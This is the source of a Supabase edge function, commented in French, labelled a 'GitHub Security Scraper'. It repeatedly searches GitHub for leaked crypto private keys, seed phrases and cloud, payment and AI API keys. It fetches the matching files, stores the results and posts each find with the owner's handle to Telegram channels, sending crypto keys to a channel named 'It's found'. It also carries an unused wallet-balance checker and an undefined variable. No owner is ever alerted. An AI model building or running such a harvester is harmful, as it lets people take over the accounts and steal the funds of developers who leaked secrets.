/**
 * Supabase Edge Function - GitHub Security Scraper
 * Avec logs live Telegram + Balance checking + 2 channels
 */

import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Configuration
const CHAT_ID_ALL = '-1003113285705';  // Channel "Find it"
const CHAT_ID_FUNDED = '-1002944547225';  // Channel "It's found"

// Helper Telegram (simplifié)
async function sendTelegram(message: string, chatId: string) {
  const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
  if (!botToken) return;
  
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      }),
    });
  } catch (e) {
    console.error('Telegram error:', e);
  }
}

// Balance checker simple
async function checkBalance(codeSnippet: string) {
  try {
    // Extraire adresse Ethereum
    const ethMatch = codeSnippet.match(/0x[a-fA-F0-9]{40}/);
    if (ethMatch) {
      const address = ethMatch[0];
      const res = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest`);
      const data = await res.json();
      if (data.status === '1' && data.result) {
        const balanceETH = Number(BigInt(data.result)) / 1e18;
        if (balanceETH > 0) {
          const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
          const priceData = await priceRes.json();
          const priceUSD = priceData.ethereum?.usd || 0;
          return {
            hasBalance: true,
            balance: balanceETH.toFixed(6),
            balanceUSD: balanceETH * priceUSD,
            currency: 'ETH',
            blockchain: 'Ethereum',
            address,
          };
        }
      }
    }

    // Extraire adresse Bitcoin
    const btcMatch = codeSnippet.match(/([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,87})/);
    if (btcMatch) {
      const address = btcMatch[1];
      const res = await fetch(`https://api.blockcypher.com/v1/btc/main/addrs/${address}/balance`);
      const data = await res.json();
      if (data.final_balance) {
        const balanceBTC = data.final_balance / 1e8;
        if (balanceBTC > 0) {
          const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
          const priceData = await priceRes.json();
          const priceUSD = priceData.bitcoin?.usd || 0;
          return {
            hasBalance: true,
            balance: balanceBTC.toFixed(8),
            balanceUSD: balanceBTC * priceUSD,
            currency: 'BTC',
            blockchain: 'Bitcoin',
            address,
          };
        }
      }
    }

    return { hasBalance: false };
  } catch (e) {
    return { hasBalance: false, error: e.message };
  }
}

// Extraire clé complète
function extractFullKey(text: string): string {
  const patterns = [
    /(?:PRIVATE_KEY|WALLET_KEY|SECRET_KEY)[=:\s]*["']?([a-fA-F0-9]{64}|0x[a-fA-F0-9]{64})["']?/i,
    /(0x[a-fA-F0-9]{40})/,
    /([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,87})/,
    /([a-zA-Z0-9+/=_-]{40,})/,
  ];

  for (const p of patterns) {
    const m = text.match(p);
    if (m) return m[1] || m[0];
  }

  return text.substring(0, 200);
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  const startTime = Date.now();

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

    const githubToken = Deno.env.get('GITHUB_TOKEN');
    if (!githubToken) throw new Error('GITHUB_TOKEN not configured');

    // LOG: Démarrage
    const scanId = crypto.randomUUID().substring(0, 8);
    await sendTelegram(`
🚀 *SCAN DÉMARRÉ*

🆔 ID: \`${scanId}\`
⏰ ${new Date().toLocaleTimeString('fr-FR')}

⏳ Chargement des patterns...
    `.trim(), CHAT_ID_ALL);

    // Créer scan history
    const { data: scan } = await supabase
      .from('github_scan_history')
      .insert({ scan_type: 'code', query: 'Auto scan', status: 'running', started_at: new Date().toISOString() })
      .select('id')
      .single();

    const scanDbId = scan?.id;

    // Charger patterns
    const { data: patterns } = await supabase
      .from('github_sensitive_patterns')
      .select('*')
      .eq('is_active', true);

    // LOG: Patterns chargés
    await sendTelegram(`
✅ *Patterns Chargés*

📊 ${patterns?.length || 0} patterns actifs
🔍 Démarrage du scan GitHub...
    `.trim(), CHAT_ID_ALL);

    // RECHERCHES ULTRA-AGRESSIVES : Maximum de variations
    const queries = [
      // Clés privées crypto
      'PRIVATE_KEY in:file',
      'WALLET_KEY in:file',
      'SECRET_KEY in:file',
      'ETH_PRIVATE_KEY in:file',
      'BITCOIN_PRIVATE_KEY in:file',
      'SOLANA_PRIVATE_KEY in:file',
      
      // Mnemonics
      'MNEMONIC in:file',
      'SEED_PHRASE in:file',
      'RECOVERY_PHRASE in:file',
      
      // Exchanges crypto
      'BINANCE_API_KEY in:file',
      'BINANCE_SECRET_KEY in:file',
      'COINBASE_API_KEY in:file',
      'KRAKEN_API_KEY in:file',
      
      // Payment processors
      'STRIPE_SECRET_KEY in:file',
      'PAYPAL_CLIENT_SECRET in:file',
      'sk_live_ in:file',
      
      // Cloud providers
      'AWS_SECRET_ACCESS_KEY in:file',
      'AWS_ACCESS_KEY_ID in:file',
      'GOOGLE_CLOUD_API_KEY in:file',
      'AZURE_CLIENT_SECRET in:file',
      
      // AI APIs
      'OPENAI_API_KEY in:file',
      'ANTHROPIC_API_KEY in:file',
      'sk-proj- in:file',
      
      // Auth & JWT
      'JWT_SECRET in:file',
      'SESSION_SECRET in:file',
      
      // Databases
      'MONGODB_URI in:file',
      'POSTGRES_PASSWORD in:file',
      'MYSQL_ROOT_PASSWORD in:file',
      
      // Fichiers spécifiques
      'filename:.env',
      'filename:.env.local',
      'filename:.env.production',
      'filename:.env.development',
      'filename:.env.staging',
      'filename:config.json',
      'filename:secrets.json',
      'filename:credentials.json',
      'filename:secrets.txt',
      'filename:config.yml',
      'filename:secrets.yml',
      
      // Patterns combinés
      'private key in:file extension:env',
      'api key in:file extension:env',
      'secret in:file extension:env',
    ];

    let totalResults = 0;
    let findingsCount = 0;
    let fundedCount = 0;

    for (const query of queries) {
      // LOG: Query start
      await sendTelegram(`🔎 *Recherche:* \`${query}\`\n⏳ En cours...`, CHAT_ID_ALL);

      // Recherche avec PAGINATION pour avoir plus de résultats (max 100 par query)
      const searchRes = await fetch(
        `https://api.github.com/search/code?q=${encodeURIComponent(query)}&per_page=100&sort=indexed&order=desc`,
        { headers: { Authorization: `token ${githubToken}`, Accept: 'application/vnd.github.v3+json' } }
      );

      if (!searchRes.ok) {
        // Check rate limit
        const rateLimitRemaining = searchRes.headers.get('x-ratelimit-remaining');
        if (rateLimitRemaining && parseInt(rateLimitRemaining) < 2) {
          await sendTelegram(`⚠️ *Rate limit proche*\n\nRestant: ${rateLimitRemaining}\nPause temporaire...`, CHAT_ID_ALL);
          break;  // Stop si rate limit proche
        }
        continue;
      }

      const searchData = await searchRes.json();
      totalResults += searchData.items?.length || 0;

      // LOG: Results
      await sendTelegram(`📊 *${searchData.items?.length || 0} résultats* trouvés\n🔍 Analyse...`, CHAT_ID_ALL);

      // Limiter à 10 items par query pour éviter les timeouts
      const itemsToProcess = (searchData.items || []).slice(0, 10);
      
      for (const item of itemsToProcess) {
        try {
          const contentRes = await fetch(
            `https://api.github.com/repos/${item.repository.full_name}/contents/${item.path}`,
            { headers: { Authorization: `token ${githubToken}`, Accept: 'application/vnd.github.v3.raw' } }
          );

          if (!contentRes.ok) continue;

          const content = await contentRes.text();

          for (const pattern of patterns || []) {
            const regex = new RegExp(pattern.pattern_regex, 'gi');
            const matches = content.match(regex);

            if (matches && matches.length > 0) {
              // Check if exists
              const { data: existing } = await supabase
                .from('github_security_findings')
                .select('id')
                .eq('repository_url', item.repository.html_url)
                .eq('file_path', item.path)
                .limit(1);

              if (existing && existing.length > 0) continue;

              // Create finding
              await supabase.from('github_security_findings').insert({
                scan_id: scanDbId,
                pattern_id: pattern.id,
                repository_url: item.repository.html_url,
                repository_name: item.repository.full_name,
                repository_owner: item.repository.owner.login,
                file_path: item.path,
                code_snippet: content.substring(0, 500),
                matched_pattern: matches[0].substring(0, 50),
                pattern_type: pattern.pattern_type,
                severity: pattern.severity,
                status: 'new',
                metadata: { match_count: matches.length, file_url: item.html_url },
              });

              findingsCount++;

              // LOG LIVE: Finding détecté - SIMPLE
              const emoji = pattern.severity === 'critical' ? '🔴' : pattern.severity === 'high' ? '🟠' : '🟡';
              
              // Message SIMPLE
              const msg = `
${emoji} *FINDING #${findingsCount}*

🔍 [${item.repository.full_name}](${item.repository.html_url})
📁 \`${item.path}\`
👤 @${item.repository.owner.login}

📋 ${pattern.pattern_type} | ${pattern.severity.toUpperCase()}
🔗 [Voir le fichier](${item.html_url})
              `.trim();

              // Envoyer vers channel ALL
              await sendTelegram(msg, CHAT_ID_ALL);

              // Détecter si c'est une clé privée crypto - LISTE EXHAUSTIVE
              const isCryptoPrivateKey = [
                // Clés privées génériques
                'private_key', 'privatekey', 'private', 'wallet_key', 'walletkey', 'secret_key', 'secretkey',
                
                // Ethereum & EVM chains
                'eth_private_key', 'ethereum_private_key', 'eth_key', 'ethereum_key',
                'polygon_private_key', 'matic_private_key', 'bsc_private_key', 'bnb_private_key',
                'avalanche_private_key', 'avax_private_key', 'arbitrum_private_key', 'optimism_private_key',
                
                // Bitcoin
                'bitcoin_private_key', 'btc_private_key', 'bitcoin_key', 'btc_key',
                'wif', 'wallet_import_format',
                
                // Solana
                'solana_private_key', 'sol_private_key', 'solana_key', 'sol_key',
                'solana_wallet', 'phantom_key',
                
                // Cardano
                'cardano_private_key', 'ada_private_key', 'cardano_key', 'ada_key',
                
                // Polkadot
                'polkadot_private_key', 'dot_private_key', 'kusama_private_key',
                
                // Tron
                'tron_private_key', 'trx_private_key', 'tron_key', 'trx_key',
                
                // Ripple
                'ripple_private_key', 'xrp_private_key', 'ripple_secret', 'xrp_secret',
                
                // Litecoin
                'litecoin_private_key', 'ltc_private_key', 'litecoin_key', 'ltc_key',
                
                // Dogecoin
                'dogecoin_private_key', 'doge_private_key', 'dogecoin_key', 'doge_key',
                
                // Monero
                'monero_private_key', 'xmr_private_key', 'monero_key', 'xmr_key',
                
                // Cosmos
                'cosmos_private_key', 'atom_private_key', 'cosmos_key', 'atom_key',
                
                // Near
                'near_private_key', 'near_key', 'near_secret',
                
                // Algorand
                'algorand_private_key', 'algo_private_key', 'algorand_key', 'algo_key',
                
                // Tezos
                'tezos_private_key', 'xtz_private_key', 'tezos_key', 'xtz_key',
                
                // Stellar
                'stellar_private_key', 'xlm_private_key', 'stellar_secret', 'xlm_secret',
                
                // Seed phrases / Mnemonics (BIP39)
                'mnemonic', 'seed_phrase', 'seedphrase', 'recovery_phrase', 'recoveryphrase',
                'seed_words', 'recovery_words', 'backup_phrase', 'secret_phrase',
                'wallet_seed', 'wallet_mnemonic', '12_words', '24_words',
                
                // Exchange APIs
                'binance_api_key', 'binance_secret', 'binance_private',
                'coinbase_api', 'coinbase_secret', 'coinbase_private',
                'kraken_api', 'kraken_secret', 'kraken_private',
                'kucoin_api', 'kucoin_secret', 'kucoin_private',
                'bybit_api', 'bybit_secret', 'bybit_private',
                'okx_api', 'okx_secret', 'okx_private',
                'huobi_api', 'huobi_secret', 'huobi_private',
                'bitfinex_api', 'bitfinex_secret', 'bitfinex_private',
                'gate_io_api', 'gateio_api', 'gate_secret',
                'ftx_api', 'ftx_secret', 'ftx_private',
                
                // Wallet specifics
                'metamask', 'trust_wallet', 'phantom', 'exodus', 'ledger',
                'trezor', 'electrum', 'myetherwallet', 'coinomi',
                
                // Hardware wallets
                'hardware_wallet', 'cold_wallet', 'paper_wallet',
                
                // Web3 / Crypto general
                'crypto_key', 'crypto_private', 'crypto_secret', 'crypto_wallet',
                'web3_private', 'web3_key', 'blockchain_key', 'blockchain_private',
                
                // Keystore
                'keystore', 'keystorejson', 'wallet_json', 'encrypted_key',
              ].some(keyword => {
                const lower = pattern.pattern_type.toLowerCase();
                const nameLower = pattern.pattern_name.toLowerCase();
                return lower.includes(keyword) || nameLower.includes(keyword);
              });

              // ENVOI AUTOMATIQUE au canal FUNDED si c'est une clé crypto
              if (isCryptoPrivateKey) {
                // Déterminer la blockchain potentielle
                let blockchain = '🔐 Crypto Wallet';
                const patternLower = pattern.pattern_type.toLowerCase();
                const nameLower = pattern.pattern_name.toLowerCase();
                const combined = `${patternLower} ${nameLower}`;
                
                // Détection blockchain simplifiée
                if (combined.includes('eth') || combined.includes('ethereum')) blockchain = '⟠ Ethereum';
                else if (combined.includes('polygon') || combined.includes('matic')) blockchain = '🟣 Polygon';
                else if (combined.includes('bsc') || combined.includes('bnb')) blockchain = '🟡 BNB Chain';
                else if (combined.includes('btc') || combined.includes('bitcoin')) blockchain = '₿ Bitcoin';
                else if (combined.includes('sol') || combined.includes('solana')) blockchain = '◎ Solana';
                else if (combined.includes('mnemonic') || combined.includes('seed')) blockchain = '🔑 Multi-chain (BIP39)';
                else if (combined.includes('binance')) blockchain = '🅱️ Binance';
                else if (combined.includes('coinbase')) blockchain = '🟦 Coinbase';
                
                // Message SIMPLE pour le canal FUNDED
                const fundedMsg = `
🔑 *CLÉ CRYPTO DÉTECTÉE*

⛓️ ${blockchain}

🔑 *CLÉ:*
\`${fullKey}\`

📍 ${item.repository.full_name}
👤 @${item.repository.owner.login}
🔗 [Voir le repo](${item.repository.html_url})
                `.trim();
                
                await sendTelegram(fundedMsg, CHAT_ID_FUNDED);
                fundedCount++;
              }
            }
          }
        } catch (e) {
          console.error('Item error:', e);
        }
      }
    }

    // Update scan
    if (scanDbId) {
      await supabase
        .from('github_scan_history')
        .update({
          status: 'completed',
          completed_at: new Date().toISOString(),
          total_results: totalResults,
          findings_count: findingsCount,
        })
        .eq('id', scanDbId);
    }

    const duration = Math.round((Date.now() - startTime) / 1000);

    // LOG FINAL
    await sendTelegram(`
✅ *SCAN TERMINÉ*

📊 *Résultats:*
\`\`\`
Résultats  : ${totalResults}
Findings   : ${findingsCount}
Avec fonds : ${fundedCount}
Durée      : ${duration}s
\`\`\`

⏰ Prochain scan : Dans 1 minute (automatique)
    `.trim(), CHAT_ID_ALL);

    return new Response(
      JSON.stringify({ success: true, findingsCount, fundedCount, totalResults }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' }, status: 200 }
    );
  } catch (error: any) {
    await sendTelegram(`❌ *ERREUR*\n\n${error.message}`, CHAT_ID_ALL);
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' }, status: 500 }
    );
  }
});